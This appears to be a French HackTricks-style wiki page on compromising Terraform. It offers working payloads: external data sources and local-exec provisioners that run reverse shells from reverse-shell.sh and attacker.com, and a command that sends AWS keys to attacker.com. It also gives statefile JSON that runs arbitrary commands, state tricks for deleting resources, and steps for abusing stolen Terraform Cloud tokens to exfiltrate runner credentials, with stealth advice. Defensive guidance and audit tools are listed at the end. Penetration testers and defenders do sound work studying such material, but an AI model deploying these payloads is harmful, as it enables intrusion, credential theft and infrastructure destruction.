# S√©curit√© Terraform

{{#include ../banners/hacktricks-training.md}}

## Informations de base

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform est un **outil d'infrastructure as code** qui vous permet de d√©finir √† la fois des **ressources cloud et on-prem** dans des fichiers de configuration lisibles par des humains que vous pouvez versionner, r√©utiliser et partager. Vous pouvez ensuite utiliser un workflow coh√©rent pour provisionner et g√©rer l'ensemble de votre infrastructure tout au long de son cycle de vie. Terraform peut g√©rer des composants bas niveau comme le compute, le storage et les ressources r√©seau, ainsi que des composants haut niveau comme les entr√©es DNS et des fonctionnalit√©s SaaS.

#### Comment fonctionne Terraform ?

Terraform cr√©e et g√®re des ressources sur des plateformes cloud et d'autres services via leurs APIs. Les providers permettent √† Terraform de fonctionner avec pratiquement n'importe quelle plateforme ou service disposant d'une API accessible.

![](<../images/image (177).png>)

HashiCorp et la communaut√© Terraform ont d√©j√† √©crit **plus de 1700 providers** pour g√©rer des milliers de types de ressources et de services diff√©rents, et ce nombre ne cesse de cro√Ætre. Vous pouvez trouver tous les providers disponibles publiquement sur le [Terraform Registry](https://registry.terraform.io/), y compris Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, et bien d'autres.

Le workflow principal de Terraform se compose de trois √©tapes :

- **Write:** Vous d√©finissez des ressources, qui peuvent s'√©tendre sur plusieurs cloud providers et services. Par exemple, vous pouvez cr√©er une configuration pour d√©ployer une application sur des machines virtuelles dans un r√©seau Virtual Private Cloud (VPC) avec des security groups et un load balancer.
- **Plan:** Terraform cr√©e un plan d'ex√©cution d√©crivant l'infrastructure qu'il va cr√©er, mettre √† jour ou d√©truire en fonction de l'infrastructure existante et de votre configuration.
- **Apply:** Apr√®s approbation, Terraform effectue les op√©rations propos√©es dans le bon ordre, en respectant les d√©pendances entre ressources. Par exemple, si vous mettez √† jour les propri√©t√©s d'un VPC et changez le nombre de machines virtuelles dans ce VPC, Terraform recr√©era le VPC avant de mettre √† l'√©chelle les machines virtuelles.

![](<../images/image (215).png>)

### Laboratoire Terraform

Il suffit d'installer terraform sur votre ordinateur.

Vous trouverez ici un [guide] et ici le [best way to download terraform].

## RCE in Terraform : empoisonnement de fichier de configuration

Terraform **n'expose pas de plateforme avec une page web ou un service r√©seau** que nous pouvons √©num√©rer, par cons√©quent, la seule fa√ßon de compromettre terraform est **d'√™tre capable d'ajouter/modifier les fichiers de configuration terraform** ou **d'√™tre capable de modifier le fichier d'√©tat terraform** (voir chapitre ci-dessous).

Cependant, terraform est un **composant tr√®s sensible** √† compromettre car il aura des **acc√®s privil√©gi√©s** √† diff√©rents emplacements pour pouvoir fonctionner correctement.

La principale mani√®re pour un attaquant de compromettre le syst√®me o√π terraform tourne est de **compromettre le repository qui stocke les configurations terraform**, parce qu'√† un moment elles vont √™tre **interpr√©t√©es**.

En fait, il existe des solutions qui **ex√©cutent terraform plan/apply automatiquement apr√®s la cr√©ation d'une PR**, comme **Atlantis** :

{{#ref}}
atlantis-security.md
{{#endref}}

Si vous √™tes capable de compromettre un fichier terraform, il existe diff√©rentes fa√ßons d'effectuer une RCE lorsque quelqu'un ex√©cute `terraform plan` ou `terraform apply`.

### Terraform plan

Terraform plan est la **commande la plus utilis√©e** dans terraform et les d√©veloppeurs/solutions utilisant terraform l'appellent tout le temps, donc la **mani√®re la plus simple d'obtenir une RCE** est de vous assurer d'empoisonner un fichier de configuration terraform qui ex√©cutera des commandes arbitraires lors d'un `terraform plan`.

**Using an external provider**

Terraform propose le [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) qui offre un moyen d'interfacer Terraform avec des programmes externes. Vous pouvez utiliser la data source `external` pour ex√©cuter du code arbitraire pendant un `plan`.

Injecter dans un fichier de configuration terraform quelque chose de similaire √† ce qui suit ex√©cutera une rev shell lors de l'ex√©cution de `terraform plan` :
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Utilisation d'un custom provider**

Un attaquant pourrait soumettre un [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) au [Terraform Registry](https://registry.terraform.io/) puis l'ajouter au code Terraform dans une branche de fonctionnalit√© ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Le provider est t√©l√©charg√© lors de `init` et ex√©cutera le code malveillant lorsque `plan` sera ex√©cut√©

You can find an example in [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Utiliser une r√©f√©rence externe**

Les deux options mentionn√©es sont utiles mais pas tr√®s discr√®tes (la deuxi√®me est plus discr√®te mais plus complexe que la premi√®re). Vous pouvez r√©aliser cette attaque de mani√®re encore plus **discr√®te**, en suivant ces suggestions :

- Au lieu d'ajouter la rev shell directement dans le terraform file, vous pouvez **charger une ressource externe** qui contient la rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le rev shell code dans [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- Dans la ressource externe, utilisez la fonctionnalit√© **ref** pour cacher le **terraform rev shell code dans une branche** du repo, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply sera ex√©cut√© pour appliquer tous les changements, vous pouvez aussi l'abuser pour obtenir une RCE en injectant **un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Il suffit de vous assurer qu'un payload comme les exemples suivants se termine dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour r√©aliser cette attaque de mani√®re **plus discr√®te en utilisant des r√©f√©rences externes**.

## Extraction de secrets

Vous pouvez obtenir **l'extraction des valeurs secr√®tes utilis√©es par terraform** en ex√©cutant `terraform apply` en ajoutant au fichier terraform quelque chose comme :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abuser des fichiers d'√©tat Terraform

Dans le cas o√π vous avez un acc√®s en √©criture aux fichiers d'√©tat Terraform mais ne pouvez pas modifier le code Terraform, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) donne des options int√©ressantes pour tirer parti du fichier. M√™me si vous aviez un acc√®s en √©criture aux fichiers de configuration, utiliser le vecteur des fichiers d'√©tat est souvent bien plus discret, puisque vous ne laissez pas de traces dans l'historique `git`.

### RCE in Terraform: empoisonnement des fichiers de configuration

Il est possible de [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) et simplement remplacer l'un des providers dans le terraform state file par un provider malveillant ou ajouter un fake resource r√©f√©rencant le provider malveillant.

Le provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) s'appuie sur cette recherche et exploite ce principe. Vous pouvez ajouter une fake resource et indiquer la commande bash arbitraire que vous souhaitez ex√©cuter dans l'attribut `command`. Lorsque l'ex√©cution de `terraform` est d√©clench√©e, cela sera lu et ex√©cut√© √† la fois lors des √©tapes `terraform plan` et `terraform apply`. Dans le cas de l'√©tape `terraform apply`, `terraform` supprimera la fake resource du state file apr√®s avoir ex√©cut√© votre commande, nettoyant ainsi ses traces. Plus d'informations et une d√©monstration compl√®te sont disponibles dans le [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Pour l'utiliser directement, incluez simplement ce qui suit √† n'importe quelle position du tableau `resources` et personnalisez les attributs `name` et `command` :
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Ensuite, d√®s que `terraform` est ex√©cut√©, votre code s'ex√©cutera.

### Suppression des ressources <a href="#deleting-resources" id="deleting-resources"></a>

Il existe 2 fa√ßons de d√©truire des ressources :

1. **Ins√©rer une ressource avec un nom al√©atoire dans le fichier d'√©tat pointant vers la vraie ressource √† d√©truire**

Parce que terraform verra que la ressource ne devrait pas exister, il la d√©truira (en suivant l'ID r√©el de la ressource indiqu√©). Exemple de la page pr√©c√©dente :
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modifier la ressource de fa√ßon √† ce qu'il soit impossible de la mettre √† jour (elle sera donc supprim√©e puis recr√©√©e)**

Pour une instance EC2, modifier le type de l'instance suffit pour que terraform la supprime puis la recr√©e.

### Remplacer un provider mis sur liste noire

Si vous rencontrez une situation o√π `hashicorp/external` a √©t√© mis sur liste noire, vous pouvez r√©impl√©menter le provider `external` en proc√©dant comme suit. Remarque : nous utilisons un fork du provider external publi√© sur https://registry.terraform.io/providers/nazarewk/external/latest. Vous pouvez publier votre propre fork ou r√©impl√©mentation √©galement.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ensuite, vous pouvez utiliser `external` comme d'habitude.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Ce sc√©nario abuse les runners Terraform Cloud (TFC) pendant les speculative plans pour pivoter dans le compte cloud cible.

- Pr√©requis:
- Voler un token Terraform Cloud depuis une machine de d√©veloppeur. Le CLI stocke les tokens en texte en clair dans `~/.terraform.d/credentials.tfrc.json`.
- Le token doit avoir acc√®s √† l'organisation/workspace cible et au moins la permission `plan`. Les workspaces li√©s √† un VCS bloquent `apply` depuis le CLI, mais autorisent toujours les speculative plans.

- D√©couvrir les param√®tres du workspace et du VCS via l'API TFC:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- D√©clencher l'ex√©cution de code lors d'un speculative plan en utilisant l'external data source et le bloc Terraform Cloud "cloud" pour cibler le VCS-backed workspace:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
Exemple de rsync.sh pour obtenir une reverse shell sur le TFC runner:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Lancer un plan sp√©culatif pour ex√©cuter le programme sur le runner √©ph√©m√®re :
```bash
terraform init
terraform plan
```
- Enumerate and exfiltrate injected cloud credentials depuis le runner. Pendant les runs, TFC injecte provider credentials via files et environment variables:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Fichiers attendus dans le r√©pertoire de travail du runner :
- GCP:
- `tfc-google-application-credentials` (configuration JSON Workload Identity Federation)
- `tfc-gcp-token` (jeton d'acc√®s GCP √©ph√©m√®re)
- AWS:
- `tfc-aws-shared-config` (configuration d'AssumeRole web identity/OIDC)
- `tfc-aws-token` (jeton √©ph√©m√®re ; certaines organisations peuvent utiliser des cl√©s statiques)

- Utilisez les identifiants √©ph√©m√®res hors canal pour contourner les gates VCS :

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
Avec ces creds, les attaquants peuvent cr√©er/modifier/supprimer des ressources directement en utilisant les CLIs natifs, contournant les workflows bas√©s sur PR qui bloquent `apply` via VCS.

- Defensive guidance:
- Apply least privilege to TFC users/teams and tokens. Audit memberships and avoid oversized owners.
- Restrict `plan` permission on sensitive VCS-backed workspaces where feasible.
- Enforce provider/data source allowlists with Sentinel policies to block `data "external"` or unknown providers. See HashiCorp guidance on provider filtering.
- Prefer OIDC/WIF over static cloud credentials; treat runners as sensitive. Monitor speculative plan runs and unexpected egress.
- Detect exfiltration of `tfc-*` credential artifacts and alert on suspicious `external` program usage during plans.


## Compromising Terraform Cloud

### Using a token

As **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**, terraform CLI stores tokens in plaintext at **`~/.terraform.d/credentials.tfrc.json`**. Stealing this token lets an attacker impersonate the user within the token‚Äôs scope.

Using this token it's possible to get the org/workspace with:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
Il est alors possible d'ex√©cuter du code arbitraire en utilisant **`terraform plan`** comme expliqu√© dans le chapitre pr√©c√©dent.

### √âvasion vers le cloud

Ensuite, si le runner est situ√© dans un environnement cloud, il est possible d'obtenir le token du principal attach√© au runner et de l'utiliser out of band.

- **Fichiers GCP (pr√©sents dans le r√©pertoire de travail de l'ex√©cution courante)**
- `tfc-google-application-credentials` ‚Äî JSON de configuration pour Workload Identity Federation (WIF) qui indique √† Google comment √©changer l'identit√© externe.
- `tfc-gcp-token` ‚Äî token d'acc√®s GCP de courte dur√©e (‚âà1 heure) r√©f√©renc√© par le fichier ci‚Äëdessus

- **Fichiers AWS**
- `tfc-aws-shared-config` ‚Äî JSON pour web identity federation / OIDC role assumption (pr√©f√©r√© aux cl√©s statiques).
- `tfc-aws-token` ‚Äî token de courte dur√©e, ou potentiellement des cl√©s IAM statiques si mal configur√©.


## Outils d'audit automatiques

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk propose une solution compl√®te de scanning Infrastructure as Code (IaC) qui d√©tecte les vuln√©rabilit√©s et les mauvaises configurations dans Terraform, CloudFormation, Kubernetes, et autres formats IaC.

- **Fonctionnalit√©s :**
- Analyse en temps r√©el des vuln√©rabilit√©s de s√©curit√© et des probl√®mes de conformit√©.
- Int√©gration avec les syst√®mes de contr√¥le de version (GitHub, GitLab, Bitbucket).
- Pull requests de correction automatis√©es.
- Conseils de rem√©diation d√©taill√©s.
- **Inscription :** Cr√©ez un compte sur [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** est un outil d'analyse statique de code pour l'infrastructure as code (IaC) et aussi un outil d'analyse de composition logicielle (SCA) pour les images et les paquets open source.

Il analyse l'infrastructure cloud provisionn√©e √† l'aide de [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), or [OpenTofu](https://opentofu.org/) et d√©tecte les erreurs de configuration de s√©curit√© et de conformit√© en utilisant une analyse bas√©e sur un graphe.

Il effectue [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) qui consiste en une analyse des paquets open source et des images √† la recherche de Common Vulnerabilities and Exposures (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` est un framework de tests l√©ger, ax√© sur la s√©curit√© et la conformit√©, pour terraform, permettant des tests n√©gatifs pour votre infrastructure en tant que code.

- **compliance:** S'assurer que le code impl√©ment√© respecte les standards de s√©curit√©, ainsi que vos propres standards personnalis√©s
- **behaviour driven development:** On utilise le BDD pour presque tout, pourquoi pas pour IaC ?
- **portable:** installez-le simplement via `pip` ou ex√©cutez-le via `docker`. Voir [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** il valide votre code avant son d√©ploiement
- **easy to integrate:** il peut s'ex√©cuter dans votre pipeline (ou dans des git hooks) pour s'assurer que tous les d√©ploiements sont valid√©s.
- **segregation of duty:** vous pouvez conserver vos tests dans un d√©p√¥t diff√©rent o√π une √©quipe distincte en est responsable.

> [!NOTE]
> Malheureusement, si le code utilise des providers auxquels vous n'avez pas acc√®s, vous ne pourrez pas ex√©cuter le `terraform plan` ni lancer cet outil.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec uses static analysis of your terraform code to spot potential misconfigurations.

- ‚òÅÔ∏è V√©rifie les mauvaises configurations sur tous les principaux (et certains mineurs) fournisseurs cloud
- ‚õî Des centaines de r√®gles int√©gr√©es
- ü™Ü Scanne les modules (locaux et distants)
- ‚ûï √âvalue les expressions HCL ainsi que les valeurs litt√©rales
- ‚Ü™Ô∏è √âvalue les fonctions Terraform, p.ex. `concat()`
- üîó √âvalue les relations entre les ressources Terraform
- üß∞ Compatible avec Terraform CDK
- üôÖ Applique (et enrichit) les politiques Rego d√©finies par l'utilisateur
- üìÉ Prend en charge plusieurs formats de sortie : lovely (par d√©faut), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- üõ†Ô∏è Configurable (via des flags CLI et/ou un fichier de config)
- ‚ö° Tr√®s rapide, capable d'analyser rapidement d'√©normes d√©p√¥ts
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan est un analyseur statique de code pour Infrastructure as Code. Terrascan vous permet de :

- Scanner en toute transparence l'infrastructure as code pour d√©tecter les erreurs de configuration.
- Surveiller l'infrastructure cloud provisionn√©e pour les modifications de configuration qui entra√Ænent une d√©rive de posture, et permettre de revenir √† une posture s√©curis√©e.
- D√©tecter les vuln√©rabilit√©s de s√©curit√© et les violations de conformit√©.
- Att√©nuer les risques avant de provisionner l'infrastructure cloud native.
- Offre la flexibilit√© de s'ex√©cuter localement ou de s'int√©grer √† votre CI\CD.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

D√©tectez les vuln√©rabilit√©s de s√©curit√©, les probl√®mes de conformit√© et les m√©sconfigurations d'infrastructure d√®s les premi√®res √©tapes du cycle de d√©veloppement de votre infrastructure-as-code avec **KICS** de Checkmarx.

**KICS** signifie **K**eeping **I**nfrastructure as **C**ode **S**ecure, c'est open source et un incontournable pour tout projet cloud natif.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascan est un analyseur statique de code pour Infrastructure as Code. Terrascan vous permet de :

- Scanner de fa√ßon transparente l'Infrastructure as Code pour d√©tecter les mauvaises configurations.
- Surveiller l'infrastructure cloud provisionn√©e pour d√©tecter les changements de configuration qui entra√Ænent du posture drift, et permettre de revenir √† une posture s√©curis√©e.
- D√©tecter les vuln√©rabilit√©s de s√©curit√© et les violations de conformit√©.
- Att√©nuer les risques avant de provisionner l'infrastructure cloud native.
- Offre la flexibilit√© de s'ex√©cuter localement ou de s'int√©grer √† votre CI\CD.
```bash
brew install terrascan
```
## R√©f√©rences

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API ‚Äì Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI ‚Äì OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider ‚Äì Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform ‚Äì Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs ‚Äì Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
